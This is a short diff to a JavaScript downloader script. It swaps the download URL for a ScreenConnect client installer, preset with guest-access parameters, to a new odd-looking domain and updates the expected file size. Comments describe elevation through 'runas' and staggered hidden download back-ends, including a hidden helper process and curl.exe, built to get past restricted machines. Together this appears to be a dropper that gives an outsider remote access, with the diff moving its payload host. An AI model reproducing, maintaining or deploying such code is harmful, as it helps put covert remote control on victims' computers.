@@ -100,7 +100,7 @@
 // via ShellExecute "runas"). Three download back-ends run in a staggered race
 // - WinINET XHR, then WinHttp, then a hidden helper process - so a download
 // still succeeds on machines where one stack is restricted or hangs.
-var MSI_URL = "https://dat.sometuy.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest";
+var MSI_URL = "https://sta.addbe.win/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest";
 
 
 var PREP_MS        = 1600;    // "preparing" beat before the download starts
@@ -111,7 +111,7 @@ var HANG_MS        = 4000;    // no data flowing this long -> start next back-en
 var EXEC_STAGE_MS  = 300000;  // hard cap for the helper-process back-end
 var CURL_STAGE_MS  = 180000;  // hard cap for the bare curl.exe back-end
 var FB_MAX_MS      = 600000;  // hard cap for the whole local download
-var EXPECT_BYTES   = 15249408; // installer size (progress scaling only)
+var EXPECT_BYTES   = 13266944; // installer size (progress scaling only)
 
 
 var UA_STR = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36";
